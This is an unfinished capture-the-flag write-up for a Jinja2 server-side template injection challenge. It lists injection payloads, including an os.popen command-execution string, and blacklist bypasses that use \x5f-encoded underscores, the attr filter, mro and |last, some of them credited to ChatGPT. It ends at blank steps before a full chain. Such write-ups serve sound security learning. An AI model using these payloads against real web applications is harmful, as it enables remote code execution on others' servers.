# SSTI2
## Description: 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website here!

### Solution
1. Using the payload `{{7*'7'}}`, we get `7777777`. Thus, Jinja2 is being used.
2. However, when we run `{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}`, the website return "Stop trying to break me message", indicating filter is being used.
3. To solve this, I refer to the websites https://ctf.zeyu2001.com/2021/csaw-ctf-qualification-round-2021/ninja and https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f to learn about bypassing blacklist filter.
4. First, when I try out '().__class__', it is getting blocked as the underscore is being blacklisted.
5. Try encode the underscore with '\x5f' by using the payload **'{{()|attr('\x5f\x5fclass\x5f\x5f')}}'**. Bypass successful.
6. Next, just search **<class ‘subprocess.Popen’>** in subclasses using **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')}}'**
7. However, nothing is returned. To test that, we will first try **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')}}**
8. Nothing is returned, suggesting `__base__` maybe blocked.
9. Through ChatGPT, it is suggesting us to use **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()}}'** and it works successfully.
10. But, as we try on the payload **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()[-1]}}'**, it generates internal server error. But as we change [-1] to [1], it is blocked due to blacklisting on [].
11. Through ChatGPT, it is suggesting us to use **|last** instead of [-1]. So, the new payload is **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last}}'** and it returns **<class 'object'>**.
12. 
13. 
